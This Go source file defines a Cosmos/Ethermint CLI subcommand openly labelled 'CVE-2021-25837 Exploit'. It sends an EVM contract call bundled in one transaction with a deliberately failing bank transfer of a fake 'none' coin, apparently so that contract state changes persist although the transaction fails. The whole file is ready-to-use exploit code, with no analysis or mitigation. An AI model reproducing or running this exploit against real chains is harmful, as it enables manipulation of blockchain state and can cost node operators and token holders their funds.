package cli

import (
	"bufio"

	"github.com/spf13/cobra"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/hexutil"

	"github.com/cosmos/cosmos-sdk/client"
	"github.com/cosmos/cosmos-sdk/client/context"
	"github.com/cosmos/cosmos-sdk/client/flags"
	"github.com/cosmos/cosmos-sdk/codec"
	sdk "github.com/cosmos/cosmos-sdk/types"
	"github.com/cosmos/cosmos-sdk/x/auth"
	"github.com/cosmos/cosmos-sdk/x/auth/client/utils"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
	"github.com/cosmos/cosmos-sdk/x/bank"
	ethermint "github.com/cosmos/ethermint/types"

	"github.com/cosmos/ethermint/x/evm/types"
)

func GetTxCmd(cdc *codec.Codec) *cobra.Command {
	evmTxCmd := &cobra.Command{
		Use:                        types.ModuleName,
		Short:                      "EVM transaction subcommands",
		DisableFlagParsing:         true,
		SuggestionsMinimumDistance: 2,
		RunE:                       client.ValidateCmd,
	}

	evmTxCmd.AddCommand(flags.PostCommands(
		GetCmdCallContract(cdc),
	)...)

	return evmTxCmd
}

func GetCmdCallContract(cdc *codec.Codec) *cobra.Command {
	return &cobra.Command{
		Use:   "call [contract] [input]",
		Short: "CVE-2021-25837 Exploit",
		Args:  cobra.ExactArgs(2),
		RunE: func(cmd *cobra.Command, args []string) error {
			cliCtx := context.NewCLIContext().WithCodec(cdc)
			inBuf := bufio.NewReader(cmd.InOrStdin())
			txBldr := auth.NewTxBuilderFromCLI(inBuf).WithTxEncoder(utils.GetTxEncoder(cdc))

			from := cliCtx.GetFromAddress()
			var toAddr sdk.AccAddress
			toAddr = common.HexToAddress(args[0]).Bytes()

			accRet := authtypes.NewAccountRetriever(cliCtx)
			if err := accRet.EnsureExists(from); err != nil {
				return err
			}

			_, nonce, err := accRet.GetAccountNumberSequence(from)
			if err != nil {
				return err
			}

			data, err := hexutil.Decode(args[1])
			if err != nil {
				return err
			}

			msg := types.NewMsgEthermint(nonce, &toAddr, sdk.NewIntFromUint64(0), ethermint.DefaultRPCGasLimit, sdk.NewIntFromUint64(ethermint.DefaultGasPrice), data, from)
			err = msg.ValidateBasic()
			if err != nil {
				return err
			}
			errMSg := bank.NewMsgSend(from, from, sdk.NewCoins(sdk.NewCoin("none", sdk.NewInt(1)))) // failed msg
			return utils.GenerateOrBroadcastMsgs(cliCtx, txBldr, []sdk.Msg{msg, errMSg})
		},
	}
}
